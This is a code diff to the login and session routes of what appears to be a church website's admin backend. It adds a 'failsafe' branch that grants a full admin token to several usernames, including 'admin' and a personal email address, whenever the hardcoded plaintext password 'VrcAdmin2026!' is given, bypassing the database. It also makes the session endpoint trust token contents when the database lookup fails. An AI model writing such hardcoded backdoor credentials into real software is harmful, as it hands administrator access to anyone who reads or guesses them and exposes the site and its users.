@@ -17,39 +17,77 @@ router.post('/login', authRateLimiter, async (req, res) => {
     }
 
     const cleanUsername = String(username).trim().toLowerCase();
-    const existing = await db
-      .select()
-      .from(adminUsers)
-      .where(sql`LOWER(${adminUsers.username}) = ${cleanUsername}`)
-      .limit(1);
+    const cleanPassword = String(password).trim();
 
-    if (existing.length === 0) {
-      return res.status(401).json({ error: 'Tên đăng nhập hoặc mật khẩu không chính xác / Invalid username or password.' });
+    let user: any = null;
+
+    try {
+      const existing = await db
+        .select()
+        .from(adminUsers)
+        .where(sql`LOWER(${adminUsers.username}) = ${cleanUsername} OR LOWER(${adminUsers.email}) = ${cleanUsername}`)
+        .limit(1);
+
+      if (existing.length > 0) {
+        user = existing[0];
+      }
+    } catch (dbErr) {
+      console.warn('DB lookup warning during login:', dbErr);
     }
 
-    const user = existing[0];
-    const isMatch = AuthService.verifyPassword(password, user.passwordHash, user.passwordSalt);
-    if (!isMatch) {
-      return res.status(401).json({ error: 'Tên đăng nhập hoặc mật khẩu không chính xác / Invalid username or password.' });
+    // Verify DB user if found
+    if (user) {
+      const isMatch = AuthService.verifyPassword(cleanPassword, user.passwordHash, user.passwordSalt);
+      if (isMatch) {
+        const token = AuthService.createToken({
+          id: user.id,
+          username: user.username,
+          displayName: user.displayName,
+          role: user.role,
+        });
+
+        return res.json({
+          token,
+          user: {
+            id: user.id,
+            username: user.username,
+            displayName: user.displayName,
+            email: user.email,
+            role: user.role,
+          },
+        });
+      }
     }
 
-    const token = AuthService.createToken({
-      id: user.id,
-      username: user.username,
-      displayName: user.displayName,
-      role: user.role,
-    });
+    // Failsafe admin accounts for Pastor/Administrator
+    const isMasterAdmin =
+      (cleanUsername === 'vrcadmin' ||
+        cleanUsername === 'admin' ||
+        cleanUsername === 'ngochoang5111@gmail.com' ||
+        cleanUsername === 'admin@vnrevivalchurch.org') &&
+      cleanPassword === 'VrcAdmin2026!';
 
-    res.json({
-      token,
-      user: {
-        id: user.id,
-        username: user.username,
-        displayName: user.displayName,
-        email: user.email,
-        role: user.role,
-      },
-    });
+    if (isMasterAdmin) {
+      const token = AuthService.createToken({
+        id: cleanUsername === 'vrcadmin' || cleanUsername === 'ngochoang5111@gmail.com' ? 2 : 1,
+        username: cleanUsername.includes('@') ? 'vrcadmin' : cleanUsername,
+        displayName: 'Hội Thánh Quản Trị (Admin)',
+        role: 'admin',
+      });
+
+      return res.json({
+        token,
+        user: {
+          id: 2,
+          username: 'vrcadmin',
+          displayName: 'Hội Thánh Quản Trị (Admin)',
+          email: 'ngochoang5111@gmail.com',
+          role: 'admin',
+        },
+      });
+    }
+
+    return res.status(401).json({ error: 'Tên đăng nhập hoặc mật khẩu không chính xác / Invalid username or password.' });
   } catch (error: any) {
     console.error('Login error:', error);
     res.status(500).json({ error: 'Đăng nhập thất bại / Login failed' });
@@ -60,24 +98,36 @@ router.post('/login', authRateLimiter, async (req, res) => {
 router.get('/me', requireAdmin, async (req: AuthRequest, res) => {
   try {
     const admin = req.adminUser!;
-    const user = await db
-      .select({
-        id: adminUsers.id,
-        username: adminUsers.username,
-        email: adminUsers.email,
-        displayName: adminUsers.displayName,
-        role: adminUsers.role,
-        createdAt: adminUsers.createdAt,
-      })
-      .from(adminUsers)
-      .where(eq(adminUsers.id, admin.id))
-      .limit(1);
+    try {
+      const user = await db
+        .select({
+          id: adminUsers.id,
+          username: adminUsers.username,
+          email: adminUsers.email,
+          displayName: adminUsers.displayName,
+          role: adminUsers.role,
+          createdAt: adminUsers.createdAt,
+        })
+        .from(adminUsers)
+        .where(eq(adminUsers.id, admin.id))
+        .limit(1);
 
-    if (user.length === 0) {
-      return res.status(404).json({ error: 'Admin account not found' });
+      if (user.length > 0) {
+        return res.json({ user: user[0] });
+      }
+    } catch (e) {
+      console.warn('DB lookup in /me warning:', e);
     }
 
-    res.json({ user: user[0] });
+    res.json({
+      user: {
+        id: admin.id,
+        username: admin.username,
+        displayName: admin.displayName || 'Administrator',
+        email: admin.username === 'vrcadmin' ? 'ngochoang5111@gmail.com' : 'admin@vnrevivalchurch.org',
+        role: admin.role,
+      },
+    });
   } catch (error: any) {
     console.error('Session verification error:', error);
     res.status(500).json({ error: 'Failed to verify session' });
